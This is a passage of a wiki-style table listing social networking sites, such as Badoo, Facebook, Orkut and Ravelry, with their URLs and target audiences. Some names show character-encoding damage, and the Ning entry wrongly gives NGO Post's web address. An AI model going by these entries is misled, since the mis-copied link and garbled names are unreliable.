<p>|-
|Athlinks
|[<a href="http://www.athlinks.com/">http://www.athlinks.com/</a> <a href="http://www.athlinks.com">http://www.athlinks.com</a>]
|Open Running, Swimming </p>
<p>|-
|Audimated.com
|[<a href="http://www.audimated.com/">http://www.audimated.com/</a> <a href="http://www.audimated.com">http://www.audimated.com</a>]
|Independent Music </p>
<p>|-
|Avatars United
|[<a href="http://www.avatarsunited.com/">http://www.avatarsunited.com/</a> <a href="http://www.avatarsunited.com">http://www.avatarsunited.com</a>]
|Online games</p>
<p>|-
|Badoo
|[<a href="http://badoo.com/">http://badoo.com/</a> <a href="http://badoo.com">http://badoo.com</a>]
|General, Meet new people, Popular in Europe and LatAm </p>
<p>|-
|Bebo
|[<a href="http://www.bebo.com/">http://www.bebo.com/</a> <a href="http://www.bebo.com">http://www.bebo.com</a>]
|General</p>
<p>|-
|Bigadda
|[<a href="http://bigb.bigadda.com/">http://bigb.bigadda.com/</a> <a href="http://bigb.bigadda.com">http://bigb.bigadda.com</a>]
|Indian Social Networking Site </p>
<p>|-
|Federated Media's BigTent
|[<a href="http://www.federatedmedia.net/">http://www.federatedmedia.net/</a> <a href="http://www.federatedmedia.net">http://www.federatedmedia.net</a>]
|Organization and communication portal for groups</p>
<p>|-
|Biip.no
|[<a href="http://www.biip.no/">http://www.biip.no/</a> <a href="http://www.biip.no">http://www.biip.no</a>]
|Norwegian community</p>
<p>|-
|BlackPlanet
|[<a href="http://www.blackplanet.com/">http://www.blackplanet.com/</a> <a href="http://www.blackplanet.com">http://www.blackplanet.com</a>]
|African-Americans</p>
<p>|-
|Blauk
|[<a href="http://blauk.com/">http://blauk.com/</a> <a href="http://blauk.com">http://blauk.com</a>]
|Anyone who wants to tell something about a stranger or acquaintance.</p>
<p>|-
|Blogster
|[<a href="http://www.blogster.com/">http://www.blogster.com/</a> <a href="http://www.blogster.com">http://www.blogster.com</a>]
|Blogging community</p>
<p>|-
|Bolt.com
|[<a href="http://www.bolt.com/">http://www.bolt.com/</a> <a href="http://www.bolt.com">http://www.bolt.com</a>]
|General</p>
<p>|-
|Buzznet
|[<a href="http://www.buzznet.com/">http://www.buzznet.com/</a> <a href="http://www.buzznet.com">http://www.buzznet.com</a>]
|Music and pop-culture</p>
<p>|-
|CafeMom
|[<a href="http://www.cafemom.com/">http://www.cafemom.com/</a> <a href="http://www.cafemom.com">http://www.cafemom.com</a>]
|Mothers</p>
<p>|-
|Cake Financial
|[<a href="http://www.cakefinancial.com/">http://www.cakefinancial.com/</a> <a href="http://www.cakefinancial.com">http://www.cakefinancial.com</a>]
|Investing</p>
<p>|-
|Care2
|[<a href="http://www.care2.com/">http://www.care2.com/</a> <a href="http://www.care2.com">http://www.care2.com</a>]
|Green living and social activism</p>
<p>|-
|CaringBridge
|[<a href="http://www.caringbridge.org/">http://www.caringbridge.org/</a> <a href="http://www.caringbridge.org">http://www.caringbridge.org</a>]
|Not for profit providing free websites that connect family and friends during a serious health event, care and recovery.</p>
<p>|-
|Cellufun
|[<a href="http://m.cellufun.com/">http://m.cellufun.com/</a> <a href="http://m.cellufun.com">http://m.cellufun.com</a>]
|Mobile social game network, Number 8 US mobile website</p>
<p>|-
|Classmates.com
|[<a href="http://www.classmates.com/">http://www.classmates.com/</a> <a href="http://www.classmates.com">http://www.classmates.com</a>]
|School, college, work and the military </p>
<p>|-
|Cloob
|[<a href="http://www.cloob.com/">http://www.cloob.com/</a> <a href="http://www.cloob.com">http://www.cloob.com</a>]
|General. Popular in Iran </p>
<p>|-
|CouchSurfing
|[<a href="http://www.couchsurfing.org/">http://www.couchsurfing.org/</a> <a href="http://www.couchsurfing.org">http://www.couchsurfing.org</a>]
|Worldwide network for making connections between travelers and the local communities they visit.</p>
<p>|-
|CozyCot
|[<a href="http://www.cozycot.com/">http://www.cozycot.com/</a> <a href="http://www.cozycot.com">http://www.cozycot.com</a>]
|East Asian and Southeast Asian women</p>
<p>|-
|Cross.tv
|[<a href="http://www.cross.tv/">http://www.cross.tv/</a> <a href="http://www.cross.tv">http://www.cross.tv</a>]
|Faith Based social network for Christian believers from around the world</p>
<p>|-
|Crunchyroll
|[<a href="http://www.crunchyroll.com/">http://www.crunchyroll.com/</a> <a href="http://www.crunchyroll.com">http://www.crunchyroll.com</a>]
|Anime and forums.</p>
<p>|-
|Cyworld
|(Korea) [<a href="http://cyworld.co.kr/">http://cyworld.co.kr/</a> <a href="http://cyworld.co.kr">http://cyworld.co.kr</a>] <br />(China) [<a href="http://www.cyworld.com.cn/">http://www.cyworld.com.cn/</a>  <a href="http://www.cyworld.com.cn">http://www.cyworld.com.cn</a>]
|General. Popular in South Korea.</p>
<p>|-
|DailyBooth
|[<a href="http://dailybooth.com/">http://dailybooth.com/</a> <a href="http://dailybooth.com">http://dailybooth.com</a>]
|Photo-blogging site where users upload a photo every day</p>
<p>|-
|DailyStrength
|[<a href="http://www.dailystrength.org/">http://www.dailystrength.org/</a> <a href="http://www.dailystrength.org">http://www.dailystrength.org</a>]
|Medical &amp; emotional support community - Physical health, Mental health, Support groups</p>
<p>|-
|Decayenne
|[<a href="http://www.decayenne.com/">http://www.decayenne.com/</a> <a href="http://www.decayenne.com">http://www.decayenne.com</a>]
|European and American social elite</p>
<p>|-
|delicious
|[<a href="http://www.delicious.com/">http://www.delicious.com/</a> <a href="http://www.delicious.com">http://www.delicious.com</a>]
|Social bookmarking allowing users to locate and save websites that match their own interests</p>
<p>|-
|deviantART
|[<a href="http://www.deviantart.com/">http://www.deviantart.com/</a> <a href="http://www.deviantart.com">http://www.deviantart.com</a>]
|Art community</p>
<p>|-
|Disaboom
|[<a href="http://www.disaboom.com/">http://www.disaboom.com/</a> <a href="http://www.disaboom.com">http://www.disaboom.com</a>]
|People with disabilities (Amputee, cerebral palsy, MS, and other disabilities)</p>
<p>|-
|Dol2day
|[<a href="http://www.dol2day.de/">http://www.dol2day.de/</a> <a href="http://www.dol2day.de">http://www.dol2day.de</a>]
|Politic community, Social network, Internet radio (German-speaking countries)</p>
<p>|-
|DontStayIn
|[<a href="http://www.dontstayin.com/">http://www.dontstayin.com/</a> <a href="http://www.dontstayin.com">http://www.dontstayin.com</a>]
|Clubbing (primarily UK)</p>
<p>|-
|Draugiem.lv
|[<a href="http://www.draugiem.lv/">http://www.draugiem.lv/</a> <a href="http://www.draugiem.lv">http://www.draugiem.lv</a>]
|General (primarily LV, LT, HU)</p>
<p>|-
|douban
|[<a href="http://www.douban.com/">http://www.douban.com/</a> <a href="http://www.douban.com">http://www.douban.com</a>]
|Chinese Web 2.0 website providing user review and recommendation services for movies, books, and music. It is also the largest online Chinese language book, movie and music database and one of the largest online communities in China.</p>
<p>|-
|Elftown
|[<a href="http://www.elftown.com/">http://www.elftown.com/</a> <a href="http://www.elftown.com">http://www.elftown.com</a>]
|Community and wiki around Fantasy and sci-fi.</p>
<p>|-
|Entitycube
|[<a href="http://entitycube.research.microsoft.com/">http://entitycube.research.microsoft.com/</a> <a href="http://entitycube.research.microsoft.com">http://entitycube.research.microsoft.com</a>]
|&nbsp;</p>
<p>|-
|Eons.com
|[<a href="http://www.eons.com/">http://www.eons.com/</a> <a href="http://www.eons.com">http://www.eons.com</a>]
|For baby boomers</p>
<p>|-
|Epernicus
|[<a href="http://www.epernicus.com/">http://www.epernicus.com/</a> <a href="http://www.epernicus.com">http://www.epernicus.com</a>]
|For research scientists</p>
<p>|-
|Experience Project
|[<a href="http://www.experienceproject.com/">http://www.experienceproject.com/</a> <a href="http://www.experienceproject.com">http://www.experienceproject.com</a>]
|Life experiences</p>
<p>|-
|Exploroo
|[<a href="http://www.exploroo.com/">http://www.exploroo.com/</a> <a href="http://www.exploroo.com">http://www.exploroo.com</a>]
|Travel Social Networking.</p>
<p>|-
|Facebook
|(IPv4) [<a href="http://www.facebook.com/">http://www.facebook.com/</a> <a href="http://www.facebook.com">http://www.facebook.com</a>]<br>(IPv6) [<a href="http://www.v6.facebook.com/">http://www.v6.facebook.com/</a> <a href="http://www.v6.facebook.com">http://www.v6.facebook.com</a>]
|General.</p>
<p>|-
|Faceparty
|[<a href="http://www.faceparty.com/">http://www.faceparty.com/</a> <a href="http://www.faceparty.com">http://www.faceparty.com</a>]
|General. Popular UK.</p>
<p>|-
|Faces.com
|[<a href="http://www.face-pic.com/">http://www.face-pic.com/</a> <a href="http://www.face-pic.com">http://www.face-pic.com</a>]<br>[<a href="http://www.faces.com/">http://www.faces.com/</a> <a href="http://www.faces.com">http://www.faces.com</a>]
|British teens</p>
<p>|-
|Fetlife
|[<a href="http://fetlife.com/">http://fetlife.com/</a> <a href="http://fetlife.com">http://fetlife.com</a>]
|People who are into BDSM</p>
<p>|-
|FilmAffinity
|[<a href="http://www.filmaffinity.com/">http://www.filmaffinity.com/</a> <a href="http://www.filmaffinity.com">http://www.filmaffinity.com</a>]
|Movies and TV Series</p>
<p>|-
|FitFinder
|[<a href="http://www.thefitfinder.co.uk/">http://www.thefitfinder.co.uk/</a> <a href="http://www.thefitfinder.co.uk">http://www.thefitfinder.co.uk</a>]
|Anonymous UK Student Microblogging Website</p>
<p>|-
|FledgeWing
|[<a href="http://www.fledgewing.com/">http://www.fledgewing.com/</a> <a href="http://www.fledgewing.com">http://www.fledgewing.com</a>]
|Entrepreneural community targeted towards worldwide university students</p>
<p>|-
|Flixster
|[<a href="http://www.flixster.com/">http://www.flixster.com/</a> <a href="http://www.flixster.com">http://www.flixster.com</a>]
|Movies</p>
<p>|-
|Flickr
|[<a href="http://www.flickr.com/">http://www.flickr.com/</a> <a href="http://www.flickr.com">http://www.flickr.com</a>]
|Photo sharing, commenting, photography related networking, worldwide</p>
<p>|-
|Focus.com
|[<a href="http://www.focus.com/">http://www.focus.com/</a> <a href="http://www.focus.com">http://www.focus.com</a>]
|Business to Business, worldwide</p>
<p>|-
|Folkdirect
|[<a href="http://www.folkdirect.com/">http://www.folkdirect.com/</a> <a href="http://www.folkdirect.com">http://www.folkdirect.com</a>]
|General</p>
<p>|-
|Fotki
|[<a href="http://www.fotki.com/">http://www.fotki.com/</a> <a href="http://www.fotki.com">http://www.fotki.com</a>]
|Photo sharing, video hosting, photo contests, journals, forums, flexible privacy protection, friend's feed, audio comments and unlimited custom design integration.</p>
<p>|-
|Fotolog
|[<a href="http://www.fotolog.com/">http://www.fotolog.com/</a> <a href="http://www.fotolog.com">http://www.fotolog.com</a>]
|Photoblogging. Popular in South America and Spain</p>
<p>|-
|Foursquare
|[<a href="http://foursquare.com/">http://foursquare.com/</a> <a href="http://foursquare.com">http://foursquare.com</a>]
|Location based mobile social network</p>
<p>|-
|Friends Reunited
|[<a href="http://www.friendsreunited.com/">http://www.friendsreunited.com/</a> <a href="http://www.friendsreunited.com">http://www.friendsreunited.com</a>]
|UK based. School, college, work, sport and streets</p>
<p>|-
|Friendster
|[<a href="http://www.friendster.com/">http://www.friendster.com/</a> <a href="http://www.friendster.com">http://www.friendster.com</a>]
|General. Popular in Southeast Asia. No longer popular in the western world</p>
<p>|-
|Fr¸hst¸ckstreff
|[<a href="http://www.fruehstueckstreff.de/">http://www.fruehstueckstreff.de/</a> <a href="http://www.fruehstueckstreff.de">http://www.fruehstueckstreff.de</a>]
|General</p>
<p>|-
|Fubar
|[<a href="http://www.fubar.com/">http://www.fubar.com/</a> <a href="http://www.fubar.com">http://www.fubar.com</a>]
|dating, an "online bar" for 18 and older</p>
<p>|-
|Gaia Online
|[<a href="http://www.gaiaonline.com/">http://www.gaiaonline.com/</a> <a href="http://www.gaiaonline.com">http://www.gaiaonline.com</a>]
|Anime and games. Popular in USA, Canada and Europe. Moderately popular around Asia.</p>
<p>|-
|GamerDNA
|[<a href="http://www.gamerdna.com/">http://www.gamerdna.com/</a> <a href="http://www.gamerdna.com">http://www.gamerdna.com</a>]
|Computer and video games</p>
<p>|-
|Gather.com
|[<a href="http://home.gather.com/">http://home.gather.com/</a> <a href="http://home.gather.com">http://home.gather.com</a>]
|Article, picture, and video sharing, as well as group discussions</p>
<p>|-
|Gays.com
|[<a href="http://gays.com/">http://gays.com/</a> <a href="http://gays.com">http://gays.com</a>]
|Social network for LGBT community, Guide for LGBT bars, restaurants, clubs, shopping</p>
<p>|-
|Geni.com
|[<a href="http://www.geni.com/">http://www.geni.com/</a> <a href="http://www.geni.com">http://www.geni.com</a>]
|Families, genealogy</p>
<p>|-
|Gogoyoko
|[<a href="http://www.gogoyoko.com/">http://www.gogoyoko.com/</a> <a href="http://www.gogoyoko.com">http://www.gogoyoko.com</a>]
|Fair play in Music - Social networking site for musicians and music lovers</p>
<p>|-
|Goodreads
|[<a href="http://www.goodreads.com/">http://www.goodreads.com/</a> <a href="http://www.goodreads.com">http://www.goodreads.com</a>]
|Library cataloging, book lovers</p>
<p>|-
|Goodwizz
|[<a href="http://www.goodwizz.com/">http://www.goodwizz.com/</a> <a href="http://www.goodwizz.com">http://www.goodwizz.com</a>]
|Social network with matchmaking and personality games to find new contacts. Global, based in France.</p>
<p>|-
|Google Buzz
|[<a href="http://www.google.com/buzz">http://www.google.com/buzz</a> <a href="http://www.google.com/buzz">http://www.google.com/buzz</a>]
|General</p>
<p>|-
|Google+
|[<a href="http://plus.google.com/">http://plus.google.com/</a> <a href="http://plus.google.com">http://plus.google.com</a>]
|General</p>
<p>|-
|GovLoop
|[<a href="http://www.govloop.com/">http://www.govloop.com/</a> <a href="http://www.govloop.com">http://www.govloop.com</a>]
|For people in and around government</p>
<p>|-
|Gowalla
|[<a href="http://gowalla.com/">http://gowalla.com/</a> <a href="http://gowalla.com">http://gowalla.com</a>]
|&nbsp;</p>
<p>|-
|Grono.net
|[<a href="http://grono.net/">http://grono.net/</a> <a href="http://grono.net">http://grono.net</a>]
|Poland</p>
<p>|-
|Habbo
|[<a href="http://www.habbo.com/">http://www.habbo.com/</a> <a href="http://www.habbo.com">http://www.habbo.com</a>]
|General for teens. Over 31 communities worldwide. Chat Room and user profiles.</p>
<p>|-
|hi5
|[<a href="http://hi5.com/">http://hi5.com/</a> <a href="http://hi5.com">http://hi5.com</a>]
|General. Popular in India, Mongolia, Thailand, Romania, Jamaica, Central Africa, Portugal and Latin America. Not very popular in the USA.</p>
<p>|-
|Hospitality Club
|[<a href="http://www.hospitalityclub.org/">http://www.hospitalityclub.org/</a> <a href="http://www.hospitalityclub.org">http://www.hospitalityclub.org</a>]
|Hospitality</p>
<p>|-
|Hotlist
|[<a href="http://www.thehotlist.com/">http://www.thehotlist.com/</a> <a href="http://www.thehotlist.com">http://www.thehotlist.com</a>]
|Geo-Social Aggregator rooted in the concept of knowing where your friends are, were, and will be.</p>
<p>|-
|HR.com
|[<a href="http://www.hr.com/">http://www.hr.com/</a> <a href="http://www.hr.com">http://www.hr.com</a>]
|Social networking site for Human Resources professionals</p>
<p>|-
|Hub Culture
|[<a href="http://www.hubculture.com/">http://www.hubculture.com/</a> <a href="http://www.hubculture.com">http://www.hubculture.com</a>]
|Global influencers focused on worth creation</p>
<p>|-
|Hyves
|[<a href="http://www.hyves.nl/">http://www.hyves.nl/</a> <a href="http://www.hyves.nl">http://www.hyves.nl</a>]
|General, Most popular in the Netherlands.</p>
<p>|-
|Ibibo
|[<a href="http://www.ibibo.com/">http://www.ibibo.com/</a> <a href="http://www.ibibo.com">http://www.ibibo.com</a>]
|Talent based social networking site that allows to promote one's self and also discover new talent. Most popular in India.</p>
<p>|-
|Identi.ca
|[<a href="http://identi.ca/">http://identi.ca/</a> <a href="http://identi.ca">http://identi.ca</a>]
|Twitter-like service popular with hackers and software freedom advocates.</p>
<p>|-
|Indaba Music
|[<a href="http://www.indabamusic.com/">http://www.indabamusic.com/</a> <a href="http://www.indabamusic.com">http://www.indabamusic.com</a>]
|Online collaboration for musicians, remix contests, and networking.</p>
<p>|-
|IRC-Galleria
|[<a href="http://www.irc-galleria.net/">http://www.irc-galleria.net/</a> <a href="http://www.irc-galleria.net">http://www.irc-galleria.net</a>]
|Finland</p>
<p>|-
|italki.com
|[<a href="http://www.italki.com/">http://www.italki.com/</a> <a href="http://www.italki.com">http://www.italki.com</a>]
|Language learning social network. 100<nowiki>+</nowiki> languages.</p>
<p>|-
|InterNations
|[<a href="http://www.internations.org/">http://www.internations.org/</a> <a href="http://www.internations.org">http://www.internations.org</a>]
|International community</p>
<p>|-
|Itsmy
|[<a href="http://mobile.itsmy.com/">http://mobile.itsmy.com/</a> <a href="http://mobile.itsmy.com">http://mobile.itsmy.com</a>]
|Mobile community worldwide, blogging, friends, personal TV-shows</p>
<p>|-
|iWiW
|[<a href="http://iwiw.hu/">http://iwiw.hu/</a> <a href="http://iwiw.hu">http://iwiw.hu</a>]
|Hungary</p>
<p>|-
|Jaiku
|[<a href="http://www.jaiku.com/">http://www.jaiku.com/</a> <a href="http://www.jaiku.com">http://www.jaiku.com</a>]
|General. Microblogging. Owned by Google</p>
<p>|-
|JammerDirect.com
|[<a href="http://www.jammerdirect.com/">http://www.jammerdirect.com/</a> <a href="http://www.jammerdirect.com">http://www.jammerdirect.com</a>]
|Network for unsigned artists</p>
<p>|-
|kaioo
|[<a href="http://www.kaioo.com/">http://www.kaioo.com/</a> <a href="http://www.kaioo.com">http://www.kaioo.com</a>]
|General, nonprofit</p>
<p>|-
|Kaixin001
|[<a href="http://www.kaixin001.com/">http://www.kaixin001.com/</a> <a href="http://www.kaixin001.com">http://www.kaixin001.com</a>]
|General. In Simplified Chinese; caters for mainland China users</p>
<p>|-
|Kiwibox
|[<a href="http://www.kiwibox.com/">http://www.kiwibox.com/</a> <a href="http://www.kiwibox.com">http://www.kiwibox.com</a>]
|General. For the users, by the users, a social network that is more than a community.</p>
<p>|-
|Lafango
|[<a href="http://lafango.com/">http://lafango.com/</a> <a href="http://lafango.com">http://lafango.com</a>]
|Talent-Focused media sharing site</p>
<p>|-
|Last.fm
|[<a href="http://www.last.fm/">http://www.last.fm/</a> <a href="http://www.last.fm">http://www.last.fm</a>]
|Music</p>
<p>|-
|LibraryThing
|[<a href="http://www.librarything.com/">http://www.librarything.com/</a> <a href="http://www.librarything.com/">http://www.librarything.com/</a>]<br>(German) [<a href="http://www.librarything.de/">http://www.librarything.de/</a> <a href="http://www.librarything.de">http://www.librarything.de</a>]
|Book lovers</p>
<p>|-
|Lifeknot
|[<a href="http://www.lifeknot.com/">http://www.lifeknot.com/</a> <a href="http://www.lifeknot.com">http://www.lifeknot.com</a>]
|Shared interests, hobbies</p>
<p>|-
|LinkedIn
|[<a href="http://www.linkedin.com/">http://www.linkedin.com/</a> <a href="http://www.linkedin.com">http://www.linkedin.com</a>]
|Business and professional networking</p>
<p>|-
|LinkExpats
|[<a href="http://www.linkexpats.com/">http://www.linkexpats.com/</a> <a href="http://www.linkexpats.com">http://www.linkexpats.com</a>]
|Social networking website for expatriates. 100<nowiki>+</nowiki> countries.</p>
<p>|-
|Listography
|[<a href="http://listography.com/">http://listography.com/</a> <a href="http://listography.com">http://listography.com</a>]
|Lists. Autobiography</p>
<p>|-
|LiveJournal
|[<a href="http://www.livejournal.com/">http://www.livejournal.com/</a> <a href="http://www.livejournal.com">http://www.livejournal.com</a>]
|Blogging. Popular in Russia and among the Russian-speaking diaspora abroad.</p>
<p>|-
|Livemocha
|[<a href="http://www.livemocha.com/">http://www.livemocha.com/</a> <a href="http://www.livemocha.com">http://www.livemocha.com</a>]
|Online language learning - dynamic online courses in 35 languages - world's largest community of native language speakers.</p>
<p>|-
|LunarStorm
|[<a href="http://www.lunarstorm.se/">http://www.lunarstorm.se/</a> <a href="http://www.lunarstorm.se">http://www.lunarstorm.se</a>]
|Sweden</p>
<p>|-
|MEETin
|[<a href="http://www.meetin.org/">http://www.meetin.org/</a> <a href="http://www.meetin.org">http://www.meetin.org</a>]
|General</p>
<p>|-
|Meetup.com
|[<a href="http://www.meetup.com/">http://www.meetup.com/</a> <a href="http://www.meetup.com">http://www.meetup.com</a>]
|General. Used to plan offline meetings for people interested in various activities</p>
<p>|-
|Meettheboss
|[<a href="http://www.meettheboss.tv/">http://www.meettheboss.tv/</a> <a href="http://www.meettheboss.tv">http://www.meettheboss.tv</a>]
|Business and Finance community, worldwide.</p>
<p>|-
|Mixi
|[<a href="http://www.mixi.jp/">http://www.mixi.jp/</a> <a href="http://www.mixi.jp">http://www.mixi.jp</a>]
|Japan</p>
<p>|-
|mobikade
|[<a href="http://www.mkade.com/">http://www.mkade.com/</a> <a href="http://www.mkade.com">http://www.mkade.com</a>]
|mobile community, UK only</p>
<p>|-
|MocoSpace
|[<a href="http://www.mocospace.com/">http://www.mocospace.com/</a> <a href="http://www.mocospace.com">http://www.mocospace.com</a>]
|mobile community, worldwide</p>
<p>|-
|MOG
|[<a href="http://www.mog.com/">http://www.mog.com/</a> <a href="http://www.mog.com">http://www.mog.com</a>]
|Music</p>
<p>|-
|MouthShut.com
|[<a href="http://www.mouthshut.com/">http://www.mouthshut.com/</a> <a href="http://www.mouthshut.com">http://www.mouthshut.com</a>]
|Social Network, social media, consumer reviews</p>
<p>|-
|Mubi (website)
|[<a href="http://mubi.com/">http://mubi.com/</a> <a href="http://mubi.com">http://mubi.com</a>]
|Auteur cinema</p>
<p>|-
|Multiply
|[<a href="http://multiply.com/">http://multiply.com/</a> <a href="http://multiply.com">http://multiply.com</a>]
|Real world relationships. Popular in primarily in Asia.</p>
<p>|-
|Muxlim
|[<a href="http://muxlim.com/">http://muxlim.com/</a> <a href="http://muxlim.com">http://muxlim.com</a>]
|Muslim portal site</p>
<p>|-
|MyAnimeList
|[<a href="http://www.myanimelist.net/">http://www.myanimelist.net/</a> <a href="http://www.myanimelist.net">http://www.myanimelist.net</a>]
|Anime themed social community</p>
<p>|-
|MyChurch
|[<a href="http://www.mychurch.org/">http://www.mychurch.org/</a> <a href="http://www.mychurch.org">http://www.mychurch.org</a>]
|Christian Churches</p>
<p>|-
|MyHeritage
|[<a href="http://www.myheritage.com/">http://www.myheritage.com/</a> <a href="http://www.myheritage.com">http://www.myheritage.com</a>]
|family-oriented social network service</p>
<p>|-
|MyLife
|[<a href="http://www.mylife.com/">http://www.mylife.com/</a> <a href="http://www.mylife.com">http://www.mylife.com</a>]
|Locating friends and family, keeping in touch (formerly Reunion.com)</p>
<p>|-
|My Opera
|[<a href="http://my.opera.com/">http://my.opera.com/</a> <a href="http://my.opera.com">http://my.opera.com</a>]
|Blogging, mobile blogging, photo sharing, connecting with friends, Opera Link and Opera Unite. Global</p>
<p>|-
|Myspace
|[<a href="http://www.myspace.com/">http://www.myspace.com/</a> <a href="http://www.myspace.com">http://www.myspace.com</a>]
|General</p>
<p>|-
|myYearbook
|[<a href="http://www.myyearbook.com/">http://www.myyearbook.com/</a> <a href="http://www.myyearbook.com">http://www.myyearbook.com</a>]
|General, Charity</p>
<p>|-
|Nasza-klasa.pl
|[<a href="http://www.nk.pl/">http://www.nk.pl/</a> <a href="http://www.nk.pl">http://www.nk.pl</a>]
|School, college and friends. Popular in Poland</p>
<p>|-
|Netlog
|[<a href="http://www.netlog.com/">http://www.netlog.com/</a> <a href="http://www.netlog.com">http://www.netlog.com</a>]
|General. Popular in Europe, Turkey, the Arab World and Canada's QuÈbec province. Formerly known as Facebox and Redbox.</p>
<p>|-
|Nettby
|[<a href="http://www.nettby.no/">http://www.nettby.no/</a> <a href="http://www.nettby.no">http://www.nettby.no</a>]
|Norwegian Community</p>
<p>|-
|Nexopia
|[<a href="http://www.nexopia.com/">http://www.nexopia.com/</a> <a href="http://www.nexopia.com">http://www.nexopia.com</a>]
|Canada</p>
<p>|-
|NGO Post
|[<a href="http://www.ngopost.org/">http://www.ngopost.org/</a> <a href="http://www.ngopost.org">http://www.ngopost.org</a>]
|Non-Profit news sharing and networking, mainly in India</p>
<p>|-
|Ning
|[<a href="http://www.ngopost.org/">http://www.ngopost.org/</a> <a href="http://www.ngopost.org">http://www.ngopost.org</a>]
|Users create their own social websites and social networks</p>
<p>|-
|Odnoklassniki
|[<a href="http://odnoklassniki.ru/">http://odnoklassniki.ru/</a> <a href="http://odnoklassniki.ru">http://odnoklassniki.ru</a>]
|Connect with old classmates. Popular in Russia and former Soviet republics</p>
<p>|-
|OneClimate
|[<a href="http://www.oneclimate.net/">http://www.oneclimate.net/</a> <a href="http://www.oneclimate.net">http://www.oneclimate.net</a>]
|Not for Profit Social networking and Climate Change</p>
<p>|-
|OneWorldTV
|[<a href="http://tv.oneworld.net/">http://tv.oneworld.net/</a> <a href="http://tv.oneworld.net">http://tv.oneworld.net</a>]
|Not for Profit Video sharing and social networking aimed at people interested in social issues, development, environment, etc.</p>
<p>|-
|Open Diary
|[<a href="http://www.opendiary.com/">http://www.opendiary.com/</a> <a href="http://www.opendiary.com">http://www.opendiary.com</a>]
|First online blogging community, founded in 1998</p>
<p>|-
|Orkut
|[<a href="http://orkut.com/">http://orkut.com/</a> <a href="http://orkut.com">http://orkut.com</a>]
|General. Owned by Google Inc. Popular in India and Brazil.</p>
<p>|-
|OUTeverywhere
|[<a href="http://www.outeverywhere.com/">http://www.outeverywhere.com/</a> <a href="http://www.outeverywhere.com">http://www.outeverywhere.com</a>]
|Gay/LGBTQ Community</p>
<p>|-
|Passportstamp
|[<a href="http://www.passportstamp.com/">http://www.passportstamp.com/</a> <a href="http://www.passportstamp.com">http://www.passportstamp.com</a>]
|Travel</p>
<p>|-
|Partyflock
|[<a href="http://partyflock.nl/">http://partyflock.nl/</a> <a href="http://partyflock.nl">http://partyflock.nl</a>]
|Dutch virtual community for people interested in house music and other electronic dance music. Since 2001, Partyflock has evolved into the biggest online community for the dance scene in the Netherlands</p>
<p>|-
|Picasa
|[<a href="http://picasa.google.com/">http://picasa.google.com/</a> <a href="http://picasa.google.com">http://picasa.google.com</a>]
|&nbsp;</p>
<p>|-
|PicFog
|[<a href="http://picfog.com/">http://picfog.com/</a> <a href="http://picfog.com">http://picfog.com</a>]
|PicFog shows pictures from twitter ''as'' they're posted</p>
<p>|-
|Pingsta
|[<a href="http://www.pingsta.com/">http://www.pingsta.com/</a> <a href="http://www.pingsta.com">http://www.pingsta.com</a>]
|Collaborative platform for the world's Internetwork Experts</p>
<p>|-
|Plaxo
|[<a href="http://www.plaxo.com/">http://www.plaxo.com/</a> <a href="http://www.plaxo.com">http://www.plaxo.com</a>]
|Aggregator</p>
<p>|-
|Playahead
|[<a href="http://www.playahead.se/">http://www.playahead.se/</a> <a href="http://www.playahead.se">http://www.playahead.se</a>]
|Swedish, Danish teenagers</p>
<p>|-
|Playlist.com
|[<a href="http://www.playlist.com/">http://www.playlist.com/</a> <a href="http://www.playlist.com">http://www.playlist.com</a>]
|General, Music</p>
<p>|-
|Plurk
|[<a href="http://www.plurk.com/">http://www.plurk.com/</a> <a href="http://www.plurk.com">http://www.plurk.com</a>]
|Micro-blogging, RSS, updates. Very popular in Taiwan</p>
<p>|-
|Present.ly
|[<a href="http://www.presently.com/">http://www.presently.com/</a> <a href="http://www.presently.com">http://www.presently.com</a>]
|Enterprise social networking and micro-blogging</p>
<p>|-
|Qapacity
|[<a href="http://www.qapacity.com/">http://www.qapacity.com/</a> <a href="http://www.qapacity.com">http://www.qapacity.com</a>]
|A a business-oriented social networking site and a business directory</p>
<p>|-
|Quechup
|[<a href="http://quechup.com/">http://quechup.com/</a> <a href="http://quechup.com">http://quechup.com</a>]
|General, friendship, dating</p>
<p>|-
|Qzone
|[<a href="http://qzone.qq.com/">http://qzone.qq.com/</a> <a href="http://qzone.qq.com">http://qzone.qq.com</a>]
|General. In Simplified Chinese; caters for mainland China users</p>
<p>|-
|Raptr
|[<a href="http://raptr.com/">http://raptr.com/</a> <a href="http://raptr.com">http://raptr.com</a>]
|Video games</p>
<p>|-
|Ravelry
|[<a href="http://www.ravelry.com/">http://www.ravelry.com/</a> <a href="http://www.ravelry.com">http://www.ravelry.com</a>]
|Knitting and crochet</p>
<p>|-
|Renren
|[<a href="http://renren.com/">http://renren.com/</a> <a href="http://renren.com">http://renren.com</a>]
|Significant site in China. </p>
<p>|-
|ResearchGate
|[<a href="http://researchgate.net/">http://researchgate.net/</a> <a href="http://researchgate.net">http://researchgate.net</a>]
|Social network for scientific researchers</p>
<p>|-
|ReverbNation.com
|[<a href="http://www.reverbnation.com/">http://www.reverbnation.com/</a> <a href="http://www.reverbnation.com">http://www.reverbnation.com</a>]
|Social network for musician and bands</p>
<p>|-
|Ryze
|[<a href="http://www.ryze.com/">http://www.ryze.com/</a> <a href="http://www.ryze.com">http://www.ryze.com</a>]
|Business</p>
<p>|-
|ScienceStage
|[<a href="http://sciencestage.com/">http://sciencestage.com/</a> <a href="http://sciencestage.com">http://sciencestage.com</a>]
|Science-oriented multimedia platform and network for scientists</p>
<p>|-
|Scispace.net
|[<a href="http://scispace.net/">http://scispace.net/</a> <a href="http://scispace.net">http://scispace.net</a>]
|Collaborative network site for scientists</p>
<p>|-
|ShareTheMusic
|[<a href="http://www.sharethemusic.com/">http://www.sharethemusic.com/</a> <a href="http://www.sharethemusic.com">http://www.sharethemusic.com</a>]
|Music Community. Sharing and listening to music for free and legally</p>
<p>|-
|Shelfari
|[<a href="http://www.shelfari.com/">http://www.shelfari.com/</a> <a href="http://www.shelfari.com">http://www.shelfari.com</a>]
|Books</p>
<p>|-
|Skyrock
|[<a href="http://skyrock.com/">http://skyrock.com/</a> <a href="http://skyrock.com">http://skyrock.com</a>]
|Social Network in French-speaking world</p>
<p>|-
|Social Life
|[<a href="http://www.sociallife.com.br/">http://www.sociallife.com.br/</a> <a href="http://www.sociallife.com.br">http://www.sociallife.com.br</a>]
|Brazilian jet set and social elite world-wide</p>
<p>|-
|SocialVibe
|[<a href="http://www.socialvibe.com/">http://www.socialvibe.com/</a> <a href="http://www.socialvibe.com">http://www.socialvibe.com</a>]
|Social Network for Charity</p>
<p>|-
|Sonico.com
